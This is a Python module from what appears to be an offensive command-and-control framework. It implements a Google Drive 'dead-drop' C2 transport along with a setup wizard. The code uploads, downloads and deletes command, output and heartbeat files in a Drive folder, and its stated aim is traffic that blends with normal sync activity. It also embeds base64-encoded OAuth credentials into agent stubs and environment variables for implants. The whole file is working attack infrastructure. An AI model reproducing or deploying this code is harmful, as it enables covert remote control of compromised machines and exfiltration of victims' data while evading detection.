"""
Google Drive provider — transport + deployment wizard.

Dead-drop C2 channel via Google Drive API v3 (OAuth2).
Files are addressed by name within a dedicated Drive folder (FOLDER_ID).
Traffic blends with normal Drive sync activity.

Token refresh: https://oauth2.googleapis.com/token
File list:     https://www.googleapis.com/drive/v3/files?q=name='...' and 'FOLDER_ID' in parents
Download:      https://www.googleapis.com/drive/v3/files/{id}?alt=media
Upload/update: PATCH https://www.googleapis.com/upload/drive/v3/files/{id}?uploadType=media
Create:        POST  https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart
Delete:        DELETE https://www.googleapis.com/drive/v3/files/{id}
"""
import base64
import json
import re
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import Optional

import requests

from providers import _p, ask, ask_yn, err, info, ok, warn
from providers.base import (
    BaseConfig, BaseTransport, ProviderWizard, RateLimitedError, TRANSPORT_REGISTRY,
)

_HERE       = Path(__file__).parent
CREDS_FILE  = Path("credentials") / "googledrive"

_TOKEN_URL  = "https://oauth2.googleapis.com/token"
_FILES_URL  = "https://www.googleapis.com/drive/v3/files"
_UPLOAD_URL = "https://www.googleapis.com/upload/drive/v3/files"


# ╔══════════════════════════════════════════════════════════════════════════════
# ║  GOOGLEDRIVE TRANSPORT  (runtime channel)
# ╚══════════════════════════════════════════════════════════════════════════════

class GoogleDriveTransport(BaseTransport):
    """Dead-drop transport over Google Drive API v3."""

    def __init__(self, creds: dict):
        self._client_id     = creds.get("CLIENT_ID", "").strip()
        self._client_secret = creds.get("CLIENT_SECRET", "").strip()
        self._refresh_token = creds.get("REFRESH_TOKEN", "").strip()
        self._folder_id     = creds.get("FOLDER_ID", "").strip()
        self._token:        str   = ""
        self._token_expiry: float = 0.0
        self._subfolder_cache: dict = {}  # path segment → Drive folder ID

    def _access_token(self) -> str:
        import time
        if self._token and time.time() < self._token_expiry - 60:
            return self._token
        try:
            r = requests.post(_TOKEN_URL, data={
                "grant_type":    "refresh_token",
                "refresh_token": self._refresh_token,
                "client_id":     self._client_id,
                "client_secret": self._client_secret,
            }, timeout=15)
            d = r.json()
            if "error" in d:
                warn(f"[GoogleDrive] token refresh failed: {d.get('error')} — {d.get('error_description', '')}")
                return ""
            self._token        = d.get("access_token", "")
            expires_in         = int(d.get("expires_in", 3600))
            self._token_expiry = time.time() + expires_in
            return self._token
        except Exception as e:
            warn(f"[GoogleDrive] token refresh exception: {e}")
            return ""

    def _resolve_folder(self, token: str, parts: list) -> str:
        """Walk/create the folder hierarchy under _folder_id, return leaf folder ID."""
        parent = self._folder_id
        cumulative = ""
        for part in parts:
            cumulative = f"{cumulative}/{part}"
            if cumulative in self._subfolder_cache:
                parent = self._subfolder_cache[cumulative]
                continue
            # Search for existing subfolder
            safe_part = part.replace("'", "\\'")  # MED-8
            q = (f"name='{safe_part}' and '{parent}' in parents "
                 f"and mimeType='application/vnd.google-apps.folder' and trashed=false")
            try:
                r = requests.get(
                    _FILES_URL,
                    headers={"Authorization": f"Bearer {token}"},
                    params={"q": q, "fields": "files(id)"},
                    timeout=15,
                )
                files = r.json().get("files", [])
                if files:
                    fid = files[0]["id"]
                else:
                    # Create subfolder
                    r2 = requests.post(
                        _FILES_URL,
                        headers={
                            "Authorization": f"Bearer {token}",
                            "Content-Type":  "application/json",
                        },
                        json={"name": part, "mimeType": "application/vnd.google-apps.folder",
                              "parents": [parent]},
                        timeout=15,
                    )
                    fid = r2.json().get("id", "")
                    if not fid:
                        raise RuntimeError(f"[GoogleDrive] subfolder creation failed for '{part}': {r2.text[:200]}")
                self._subfolder_cache[cumulative] = fid
                parent = fid
            except RuntimeError:
                raise
            except Exception as e:
                raise RuntimeError(f"[GoogleDrive] folder resolution failed at '{part}': {e}") from e
        return parent

    def _split_path(self, path: str):
        """Return (folder_parts, filename) from a path like /Machine1/input.txt."""
        parts = [p for p in path.replace("\\", "/").split("/") if p]
        if not parts:
            return [], path
        return parts[:-1], parts[-1]

    def _file_id(self, filename: str, parent_id: str, token: str) -> Optional[str]:
        safe = filename.replace("'", "\\'")  # MED-8: escape single quotes for Drive query syntax
        q = f"name='{safe}' and '{parent_id}' in parents and trashed=false"
        try:
            r = requests.get(
                _FILES_URL,
                headers={"Authorization": f"Bearer {token}"},
                params={"q": q, "fields": "files(id)"},
                timeout=15,
            )
            files = r.json().get("files", [])
            return files[0]["id"] if files else None
        except Exception:
            return None

    def upload(self, path: str, data: bytes) -> bool:
        token = self._access_token()
        if not token:
            return False
        folder_parts, filename = self._split_path(path)
        parent_id = self._resolve_folder(token, folder_parts) if folder_parts else self._folder_id
        file_id   = self._file_id(filename, parent_id, token)
        try:
            if file_id:
                r = requests.patch(
                    f"{_UPLOAD_URL}/{file_id}?uploadType=media",
                    headers={
                        "Authorization": f"Bearer {token}",
                        "Content-Type":  "application/octet-stream",
                    },
                    data=data,
                    timeout=30,
                )
                return r.status_code == 200
            else:
                boundary = "stratum_boundary_x7k2"
                metadata = json.dumps({"name": filename, "parents": [parent_id]}).encode()
                body = (
                    f"--{boundary}\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n"
                    .encode() + metadata +
                    f"\r\n--{boundary}\r\nContent-Type: application/octet-stream\r\n\r\n"
                    .encode() + data +
                    f"\r\n--{boundary}--".encode()
                )
                r = requests.post(
                    f"{_UPLOAD_URL}?uploadType=multipart",
                    headers={
                        "Authorization": f"Bearer {token}",
                        "Content-Type":  f"multipart/related; boundary={boundary}",
                    },
                    data=body,
                    timeout=30,
                )
                if r.status_code not in (200, 201):
                    warn(f"[GoogleDrive] upload failed: HTTP {r.status_code} — {r.text[:200]}")
                return r.status_code in (200, 201)
        except Exception as e:
            warn(f"[GoogleDrive] upload exception: {e}")
            return False

    def download(self, path: str) -> Optional[bytes]:
        token = self._access_token()
        if not token:
            return None
        folder_parts, filename = self._split_path(path)
        parent_id = self._resolve_folder(token, folder_parts) if folder_parts else self._folder_id
        file_id   = self._file_id(filename, parent_id, token)
        if not file_id:
            return None
        try:
            r = requests.get(
                f"{_FILES_URL}/{file_id}?alt=media",
                headers={"Authorization": f"Bearer {token}"},
                timeout=30,
            )
            if r.status_code == 429:
                raise RateLimitedError("Google Drive rate limited")
            if r.status_code == 200:
                return r.content
            return None
        except RateLimitedError:
            raise
        except Exception:
            return None

    def delete(self, path: str) -> bool:
        token = self._access_token()
        if not token:
            return False
        folder_parts, filename = self._split_path(path)
        parent_id = self._resolve_folder(token, folder_parts) if folder_parts else self._folder_id
        file_id   = self._file_id(filename, parent_id, token)
        if not file_id:
            return True  # already gone
        try:
            r = requests.delete(
                f"{_FILES_URL}/{file_id}",
                headers={"Authorization": f"Bearer {token}"},
                timeout=30,
            )
            return r.status_code in (200, 204)
        except Exception:
            return False

    def delete_folder(self, folder_path: str) -> bool:
        """Delete the dead-drop folder and all its contents via Drive file-id delete."""
        token = self._access_token()
        if not token:
            return False
        # Resolve the subfolder path under the configured root folder.
        parts = [p for p in folder_path.strip("/").split("/") if p]
        folder_id = self._resolve_folder(token, parts) if parts else self._folder_id
        if not folder_id:
            return True  # nothing to delete
        try:
            r = requests.delete(
                f"{_FILES_URL}/{folder_id}",
                headers={"Authorization": f"Bearer {token}"},
                timeout=30,
            )
            return r.status_code in (200, 204, 404)
        except Exception:
            return False


TRANSPORT_REGISTRY["googledrive"] = GoogleDriveTransport


# ============================================================
# GOOGLEDRIVE CONFIG
# ============================================================

@dataclass
class GoogleDriveConfig(BaseConfig):
    """BaseConfig + Google Drive OAuth2 credentials and folder ID."""
    client_id:     str = ""
    client_secret: str = ""
    refresh_token: str = ""
    folder_id:     str = ""

    def save_creds(self) -> None:
        CREDS_FILE.parent.mkdir(parents=True, exist_ok=True)
        CREDS_FILE.write_text(
            "# Google Drive OAuth2 Configuration\n"
            f"# Generated: {datetime.now().strftime('%a %b %d %I:%M:%S %p %Z %Y')}\n\n"
            f'CLIENT_ID="{self.client_id.strip()}"\n'
            f'CLIENT_SECRET="{self.client_secret.strip()}"\n'
            f'REFRESH_TOKEN="{self.refresh_token.strip()}"\n'
            f'FOLDER_ID="{self.folder_id.strip()}"\n'
        )
        CREDS_FILE.chmod(0o600)

    def load_creds(self) -> bool:
        if not CREDS_FILE.exists():
            return False
        for line in CREDS_FILE.read_text().splitlines():
            m = re.match(r'^(\w+)=["\']?(.*?)["\']?\s*$', line.strip())
            if m:
                k, v = m.group(1), m.group(2).strip()
                if k == "CLIENT_ID":     self.client_id     = v
                if k == "CLIENT_SECRET": self.client_secret = v
                if k == "REFRESH_TOKEN": self.refresh_token = v
                if k == "FOLDER_ID":     self.folder_id     = v
        return bool(self.client_id and self.client_secret
                    and self.refresh_token and self.folder_id)


# ============================================================
# GOOGLEDRIVE WIZARD
# ============================================================

class GoogleDriveWizard(ProviderWizard):
    PROVIDER_ID   = "googledrive"
    PROVIDER_NAME = "Google Drive"
    PROVIDER_ICON = "🔵"
    TRANSPORT_DIR = _HERE / "transport"

    def _creds_path(self, deploy_dir: Path) -> Path:
        return deploy_dir / f".{self.PROVIDER_ID}_creds"

    def make_config(self) -> GoogleDriveConfig:
        cfg = GoogleDriveConfig()
        cfg.folder_path    = "/StratumSync"
        cfg.input_file     = "/cmd.log"
        cfg.output_file    = "/out.log"
        cfg.heartbeat_file = "/hb.xml"
        return cfg

    def step_auth(self, cfg: GoogleDriveConfig) -> None:
        self._step("Google Drive OAuth2 Configuration")

        if CREDS_FILE.exists():
            ans = ask(f"Found existing credentials ({CREDS_FILE}). Reuse? [Y/n]")
            if not ans or ans.lower().startswith("y"):
                if cfg.load_creds():
                    ok(f"Credentials loaded from {CREDS_FILE}")
                    return
                # Partial load — check if OAuth creds are present but FOLDER_ID is missing
                _partial = GoogleDriveConfig()
                for line in CREDS_FILE.read_text().splitlines():
                    m = re.match(r'^(\w+)=["\']?(.*?)["\']?\s*$', line.strip())
                    if m:
                        k, v = m.group(1), m.group(2).strip()
                        if k == "CLIENT_ID":     _partial.client_id     = v
                        if k == "CLIENT_SECRET": _partial.client_secret = v
                        if k == "REFRESH_TOKEN": _partial.refresh_token = v
                if _partial.client_id and _partial.client_secret and _partial.refresh_token:
                    warn("OAuth credentials found but FOLDER_ID is missing")
                    cfg.client_id     = _partial.client_id
                    cfg.client_secret = _partial.client_secret
                    cfg.refresh_token = _partial.refresh_token
                    _p([("", "")])
                    info("Create a folder on Google Drive with any name you like.")
                    info("Open it and copy the ID from the URL:")
                    info("  https://drive.google.com/drive/folders/FOLDER_ID_HERE")
                    cfg.folder_id = ask("FOLDER_ID")
                    if not cfg.folder_id:
                        err("FOLDER_ID is required")
                    cfg.save_creds()
                    ok("Credentials saved")
                    return
                else:
                    warn("Saved credentials incomplete — re-entering")

        _p([("", "")])
        _p([("class:yellow", "  Step A — Google Cloud Project + Drive API:")])
        info("— https://console.cloud.google.com/ → New project (or select existing)")
        info("— APIs & Services → Enable APIs → search 'Google Drive API' → Enable")
        _p([("", "")])
        _p([("class:yellow", "  Step B — OAuth consent screen (REQUIRED before creating credentials):")])
        info("— APIs & Services → OAuth consent screen  (or Auth Platform → Get started)")
        info("— App name: any  |  User support email: your Google account")
        info("— Audience: External → Create")
        info("— Scopes → Add or remove scopes → select https://www.googleapis.com/auth/drive → Save")
        info("— Test users → Add users → add your Google account email → Save")
        info("— Leave app in 'Testing' status (no need to publish)")
        _p([("", "")])
        _p([("class:yellow", "  Step C — Create OAuth2 credentials:")])
        info("— APIs & Services → Credentials → Create Credentials → OAuth client ID")
        info("    Application type: Desktop app  →  Create")
        info("— Copy  Client ID  and  Client secret")
        _p([("", "")])

        cfg.client_id     = ask("CLIENT_ID (from OAuth client credentials)")
        if not cfg.client_id:
            err("CLIENT_ID is required")
        cfg.client_secret = ask("CLIENT_SECRET")
        if not cfg.client_secret:
            err("CLIENT_SECRET is required")

        auth_url = (
            "https://accounts.google.com/o/oauth2/v2/auth"
            f"?client_id={cfg.client_id}"
            "&response_type=code"
            "&redirect_uri=urn:ietf:wg:oauth:2.0:oob"
            "&scope=https://www.googleapis.com/auth/drive"
            "&access_type=offline"
            "&prompt=consent"
        )
        _p([("", "")])
        _p([("class:yellow", "  Step C — Authorize:")])
        info("Open this URL in your browser and sign in with your Google account:")
        _p([("class:green", f"\n  {auth_url}\n")])
        info("After sign-in Google will show a code — copy it and paste below.")
        _p([("", "")])

        auth_code = ask("AUTHORIZATION CODE")
        if not auth_code:
            err("Authorization code is required")

        info("Exchanging code for refresh token...")
        try:
            r = requests.post(_TOKEN_URL, data={
                "grant_type":    "authorization_code",
                "code":          auth_code,
                "redirect_uri":  "urn:ietf:wg:oauth:2.0:oob",
                "client_id":     cfg.client_id,
                "client_secret": cfg.client_secret,
            }, timeout=15)
            data = r.json()
        except Exception as e:
            err(f"Token request failed: {e}")

        cfg.refresh_token = data.get("refresh_token", "")
        if not cfg.refresh_token:
            safe = {k: v for k, v in data.items() if k not in ("access_token", "refresh_token", "id_token")}
            info("Response: " + str(safe))
            err("Could not obtain refresh token — ensure you approved the Drive scope")
        ok(f"Refresh token obtained ({len(cfg.refresh_token)} chars)")
        access_token = data.get("access_token", "")

        # Create or find the dead-drop folder
        _p([("", "")])
        _p([("class:yellow", "  Step D — Create dead-drop folder:")])
        self._create_folder(cfg, access_token)

        cfg.save_creds()
        ok("Credentials saved (reusable for future deployments)")

    def step_init_channel(self, cfg: GoogleDriveConfig) -> None:
        self._step("Google Drive File Initialization")

        if not cfg.folder_id:
            err("FOLDER_ID is not set. Open Google Drive, create a folder with any name, "
                "then paste its ID (from the URL) into the credentials form.")

        t = self._make_transport(cfg)
        for dest, body in [
            (cfg.folder_path + cfg.input_file,     b"MZ"),
            (cfg.folder_path + cfg.output_file,    b"MZ"),
            (cfg.folder_path + cfg.heartbeat_file, b"MZ"),
        ]:
            if t.upload(dest, body):
                ok(f"{dest} → initialized")
            else:
                warn(f"{dest} — upload failed; check Drive API permissions")

    def _provider_subs(self, cfg: GoogleDriveConfig) -> dict:
        b64 = lambda s: base64.b64encode(s.strip().encode()).decode()
        return {
            "PLACEHOLDER_CLIENT_ID_B64":     b64(cfg.client_id),
            "PLACEHOLDER_CLIENT_SECRET_B64": b64(cfg.client_secret),
            "PLACEHOLDER_REFRESH_TOKEN_B64": b64(cfg.refresh_token),
            "PLACEHOLDER_FOLDER_ID_B64":     b64(cfg.folder_id),
            "STUB_CLIENT_ID_B64":            b64(cfg.client_id),
            "STUB_CLIENT_SECRET_B64":        b64(cfg.client_secret),
            "STUB_REFRESH_TOKEN_B64":        b64(cfg.refresh_token),
            "STUB_FOLDER_ID_B64":            b64(cfg.folder_id),
        }

    def _native_agent_extra_env(self, cfg: GoogleDriveConfig) -> dict:
        return {
            "STRATUM_APP_KEY":       cfg.client_id,
            "STRATUM_APP_SECRET":    cfg.client_secret,
            "STRATUM_REFRESH_TOKEN": cfg.refresh_token,
            "STRATUM_FOLDER_ID":     cfg.folder_id,
            "STRATUM_PROVIDER":      "googledrive",
        }

    def _make_transport(self, cfg: GoogleDriveConfig) -> GoogleDriveTransport:
        return GoogleDriveTransport({
            "CLIENT_ID":     cfg.client_id,
            "CLIENT_SECRET": cfg.client_secret,
            "REFRESH_TOKEN": cfg.refresh_token,
            "FOLDER_ID":     cfg.folder_id,
        })
